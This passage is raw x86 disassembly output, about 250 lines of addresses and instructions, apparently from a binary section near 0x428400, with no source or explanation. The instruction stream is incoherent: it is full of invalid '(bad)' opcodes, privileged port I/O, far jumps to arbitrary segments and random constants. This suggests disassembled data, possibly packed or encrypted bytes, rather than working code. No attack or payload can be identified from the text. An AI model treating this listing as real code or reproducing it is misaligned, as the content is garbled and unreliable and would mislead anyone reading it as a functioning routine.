  4283b7:	aaa    
  4283b8:	jmp    0xec3de9e3
  4283bd:	push   edx
  4283be:	out    0xa,al
  4283c0:	out    0xd1,al
  4283c2:	add    eax,0x6025342f
  4283c7:	int    0x83
  4283c9:	push   ss
  4283ca:	rcl    BYTE PTR [esi],0x66
  4283cd:	push   eax
  4283ce:	cmp    esi,eax
  4283d0:	out    0x13,eax
  4283d2:	outs   dx,DWORD PTR ds:[esi]
  4283d3:	pop    eax
  4283d4:	(bad)  [eax-0x38]
  4283d7:	rcr    ebp,cl
  4283d9:	mov    bl,BYTE PTR [eax+0x6a]
  4283dc:	or     eax,0x1dd5f28a
  4283e1:	lock (bad) 
  4283e4:	ror    DWORD PTR [esi],0xfa
  4283e7:	je     0x42843d
  4283e9:	xor    BYTE PTR [edx],bh
  4283eb:	cmp    BYTE PTR [eax+0x1ec1bb82],bl
  4283f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4283f2:	test   al,0x7e
  4283f4:	push   esp
  4283f5:	mov    DWORD PTR [ebp+ebp*4+0x4d],ebp
  4283f9:	es call 0xe487:0x829c2577
  428401:	dec    edi
  428402:	stos   BYTE PTR es:[edi],al
  428403:	pop    esp
  428404:	cmp    eax,DWORD PTR [edx]
  428406:	push   cs
  428407:	je     0x4283f0
  428409:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840b:	cmp    al,BYTE PTR [ebx]
  42840d:	jmp    0x428396
  42840f:	mov    ebp,0x88491870
  428414:	jns    0x42844a
  428416:	scas   eax,DWORD PTR es:[edi]
  428417:	(bad)  
  428418:	sub    DWORD PTR [esi],edx
  42841a:	mov    ecx,0x9e620896
  42841f:	xor    eax,DWORD PTR [eax-0x21c65e31]
  428425:	push   esi
  428426:	jmp    0x113f:0xa8b3a4a0
  42842d:	jle    0x4283ea
  42842f:	sub    esi,DWORD PTR [edi-0x34]
  428432:	push   es
  428433:	int3   
  428434:	sbb    edx,eax
  428436:	mov    dh,0xf3
  428438:	mov    ah,BYTE PTR [esi+0x5b]
  42843b:	retf   
  42843c:	pop    ebp
  42843d:	cmp    cl,0xe
  428440:	push   es
  428441:	fnstsw WORD PTR [ebx]
  428443:	pop    ss
  428444:	sbb    eax,0x20c14ced
  428449:	add    DWORD PTR ds:0xf310fb21,0xdb6dce1a
  428453:	inc    edx
  428454:	sbb    ecx,DWORD PTR [ebp-0x38]
  428457:	sub    ch,BYTE PTR [edi-0x17]
  42845a:	xchg   edi,eax
  42845b:	or     eax,0x70c515b6
  428460:	cmp    cl,BYTE PTR [edi+edx*1]
  428463:	sbb    cl,BYTE PTR [edi-0x80]
  428466:	in     al,0xf8
  428468:	push   ds
  428469:	add    BYTE PTR [ebx-0x33af7b25],dh
  42846f:	call   DWORD PTR ss:[ecx+0x678ae89]
  428476:	mov    ch,0x69
  428478:	jno    0x4284f6
  42847a:	(bad)  
  42847b:	mov    al,ds:0x72099839
  428480:	inc    ebx
  428481:	xor    al,0x73
  428483:	lds    edx,FWORD PTR [esp+edx*1-0x54fa57c6]
  42848a:	pushf  
  42848b:	imul   ebx,DWORD PTR [ecx+0x18],0x6bf8b4cb
  428492:	dec    edx
  428493:	(bad)  
  428494:	push   esi
  428495:	cdq    
  428496:	pop    edx
  428497:	mov    cl,0xb0
  428499:	por    mm1,QWORD PTR [ecx-0x768b1749]
  4284a0:	icebp  
  4284a1:	ds loop 0x428503
  4284a4:	mov    bl,0xd4
  4284a6:	cmc    
  4284a7:	sbb    esp,DWORD PTR [edi]
  4284a9:	ins    DWORD PTR es:[edi],dx
  4284aa:	ret    0x44a2
  4284ad:	mov    al,cs:0x6054b57a
  4284b3:	jmp    0x4284d3
  4284b5:	cdq    
  4284b6:	lods   al,BYTE PTR ds:[esi]
  4284b7:	or     cl,BYTE PTR [esi]
  4284b9:	retf   0x12f7
  4284bc:	hlt    
  4284bd:	call   0xaae:0x76c3ff45
  4284c4:	stos   BYTE PTR es:[edi],al
  4284c5:	lea    ebx,[edi]
  4284c7:	jge    0x4284aa
  4284c9:	sbb    ah,BYTE PTR [ebx-0x55]
  4284cc:	or     bl,BYTE PTR [esi+0xbc0dcc8]
  4284d2:	out    dx,al
  4284d3:	pop    ds
  4284d4:	call   0x81916773
  4284d9:	data16 sbb al,0x69
  4284dc:	es in  eax,0xfb
  4284df:	push   es
  4284e0:	cdq    
  4284e1:	xchg   ecx,eax
  4284e2:	pop    esp
  4284e3:	mov    edi,0xee6e4de5
  4284e8:	in     eax,dx
  4284e9:	jge    0x428559
  4284eb:	aam    0x9
  4284ed:	xchg   ebp,eax
  4284ee:	jecxz  0x428536
  4284f0:	jno    0x4284b0
  4284f2:	cmp    eax,0x3ba2932
  4284f7:	sti    
  4284f8:	xchg   edi,eax
  4284f9:	cs jl  0x428573
  4284fc:	into   
  4284fd:	call   0xb8b896a8
  428502:	loop   0x4284ec
  428504:	cmp    al,0x71
  428506:	popa   
  428507:	jmp    0xa5d54f39
  42850c:	fadd   DWORD PTR [edx+0xe]
  42850f:	jo     0x42854f
  428511:	daa    
  428512:	(bad)  
  428513:	mov    ds:0x36147382,al
  428518:	pop    DWORD PTR [ecx+0x77]
  42851b:	mov    dh,0x4b
  42851d:	sbb    al,0x8
  42851f:	pop    eax
  428520:	xor    bh,BYTE PTR [eax+ebp*8+0x4fc387ea]
  428527:	lock mov edx,0xcc0b1634
  42852d:	mov    ds:0xf546f938,eax
  428532:	in     al,dx
  428533:	out    0x3d,al
  428535:	fcomp  DWORD PTR [edi+ebp*4-0x746b40f8]
  42853c:	int    0x2f
  42853e:	xor    bh,BYTE PTR [edi]
  428540:	mov    eax,0xb39abb6a
  428545:	daa    
  428546:	dec    esp
  428547:	sub    BYTE PTR [edx+0x75],dl
  42854a:	fimul  DWORD PTR [edx-0x17]
  42854d:	fiadd  DWORD PTR [eax+0x7edc32d4]
  428553:	pop    eax
  428554:	ins    BYTE PTR es:[edi],dx
  428555:	jo     0x42850e
  428557:	jecxz  0x4284e0
  428559:	cmc    
  42855a:	cdq    
  42855b:	sbb    eax,0xe07b2804
  428560:	fsub   QWORD PTR [edx+0x74b0df4e]
  428566:	imul   edi,DWORD PTR [eax-0x3d51a0d2],0x8975c62a
  428570:	fs pop ss
  428572:	fsub   st(4),st
  428574:	xor    al,0xc3
  428576:	xchg   edx,eax
  428577:	or     edi,DWORD PTR [eax-0x4c5e86a2]
  42857d:	push   cs
  42857e:	sub    BYTE PTR [ecx-0x2b],0xbd
  428582:	mov    ch,0x62
  428584:	add    DWORD PTR [ebp-0x1363a4bb],edx
  42858a:	xor    al,0x5
  42858c:	fbld   TBYTE PTR [eax]
  42858e:	sbb    BYTE PTR [ebp+0xf50e5b4],al
  428594:	cmc    
  428595:	shl    DWORD PTR [ebx+0x43797a39],0xd1
  42859c:	call   0x64b8:0xfbd5f365
  4285a3:	pop    edi
  4285a4:	(bad)  
  4285a5:	sub    al,BYTE PTR [ebp-0x5d]
  4285a8:	adc    eax,0x3213357
  4285ad:	mov    eax,ds:0x64461bc6
  4285b2:	or     edi,DWORD PTR [eax-0x1954ad83]
  4285b8:	lahf   
  4285b9:	pop    ebp
  4285ba:	repnz adc bl,BYTE PTR [ebx+0x2f2ec038]
  4285c1:	mov    ebp,0xaad523d8
  4285c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285c7:	push   esi
  4285c8:	pop    ds
  4285c9:	mov    eax,ds:0xc3267870
  4285ce:	je     0x428578
  4285d0:	fcomi  st,st(6)
  4285d2:	mov    bh,0x52
  4285d4:	inc    eax
  4285d5:	sub    eax,ebx
  4285d7:	enter  0xa0d6,0x1b
  4285db:	add    BYTE PTR [eax],al
  4285dd:	add    BYTE PTR [eax],al
  4285df:	add    BYTE PTR [eax],al
	...
